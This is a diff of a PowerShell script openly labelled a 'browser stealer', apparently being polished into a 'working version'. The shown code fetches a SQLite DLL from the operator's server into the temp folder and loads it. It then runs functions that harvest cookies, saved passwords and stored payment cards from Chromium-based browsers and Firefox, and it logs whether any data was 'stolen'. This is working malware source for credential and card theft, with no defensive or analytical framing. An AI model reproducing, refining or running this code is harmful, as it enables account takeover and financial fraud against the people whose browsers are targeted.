@@ -1,5 +1,6 @@
 # ============================================================
-# BROWSER STEALER — DLL VERSION (Downloads from Your Server)
+# BROWSER STEALER — WORKING VERSION
+# Downloads SQLite DLL from your server
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -29,7 +30,6 @@ Write-Log ""
 
 $dllPath = "$env:TEMP\System.Data.SQLite.dll"
 
-# Clean up old DLL
 if (Test-Path $dllPath) {
     Write-Log "[+] Removing old DLL"
     Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
@@ -45,12 +45,11 @@ try {
     Write-Log "[+] Download completed"
 } catch {
     Write-Log "[!] Download failed: $_"
-    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll to your public folder"
+    Write-Log "[!] Make sure System.Data.SQLite.dll is in your public folder"
     Read-Host "Press Enter to exit"
     exit
 }
 
-# Check if file exists and is large enough
 if (-not (Test-Path $dllPath)) {
     Write-Log "[!] DLL not found after download"
     Read-Host "Press Enter to exit"
@@ -61,26 +60,22 @@ $fileSize = (Get-Item $dllPath).Length
 Write-Log "[+] File size: $fileSize bytes"
 
 if ($fileSize -lt 50000) {
-    Write-Log "[!] DLL is too small ($fileSize bytes) — not a valid DLL"
-    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll (not sqlite3.dll)"
+    Write-Log "[!] DLL is too small - not a valid DLL"
+    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll"
     Read-Host "Press Enter to exit"
     exit
 }
 
-# Load the DLL
 Write-Log "[+] Loading SQLite DLL..."
 try {
     [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
     Write-Log "[+] SQLite loaded successfully!"
 } catch {
     Write-Log "[!] Failed to load DLL: $_"
-    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll (the .NET assembly)"
-    Write-Log "[!] Not the native sqlite3.dll"
     Read-Host "Press Enter to exit"
     exit
 }
 
-# Test SQLite connection
 Write-Log "[+] Testing SQLite..."
 try {
     $testConn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=:memory:")
@@ -123,7 +118,7 @@ function Read-SQLite {
         $conn.Close()
         Remove-Item $temp -Force -ErrorAction SilentlyContinue
     } catch {
-        Write-Log "[!] SQLite error reading $($DbPath): $_"
+        Write-Log "[!] SQLite error reading database"
     }
     return $result
 }
@@ -152,7 +147,7 @@ function Get-BrowserCookies {
             }
         }
     } catch {
-        Write-Log "[!] Error reading $Name cookies: $_"
+        Write-Log "[!] Error reading $Name cookies"
     }
     return $cookies
 }
@@ -180,7 +175,7 @@ function Get-FirefoxCookies {
                         }
                     }
                 } catch {
-                    Write-Log "[!] Error reading Firefox cookies: $_"
+                    Write-Log "[!] Error reading Firefox cookies"
                 }
             }
         }
@@ -212,7 +207,7 @@ function Get-BrowserPasswords {
             }
         }
     } catch {
-        Write-Log "[!] Error reading $Name passwords: $_"
+        Write-Log "[!] Error reading $Name passwords"
     }
     return $pass
 }
@@ -239,7 +234,7 @@ function Get-FirefoxPasswords {
                         }
                     }
                 } catch {
-                    Write-Log "[!] Error reading Firefox passwords: $_"
+                    Write-Log "[!] Error reading Firefox passwords"
                 }
             }
         }
@@ -279,7 +274,7 @@ function Get-BrowserCards {
             }
         }
     } catch {
-        Write-Log "[!] Error reading $Name cards: $_"
+        Write-Log "[!] Error reading $Name cards"
     }
     return $cards
 }
@@ -383,11 +378,11 @@ if ($allCards.Count -gt 0) {
 }
 
 if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
-    Write-Log "[!] No data stolen!"
+    Write-Log "[!] No data stolen"
     Write-Log "[*] Possible reasons:"
-    Write-Log "  - No saved passwords/cookies in browsers"
-    Write-Log "  - Browser is running (locks the database)"
-    Write-Log "  - Close the browser and try again"
+    Write-Log "   - No saved passwords/cookies in browsers"
+    Write-Log "   - Browser is running (locks the database)"
+    Write-Log "   - Close the browser and try again"
     Write-Log ""
 }
 
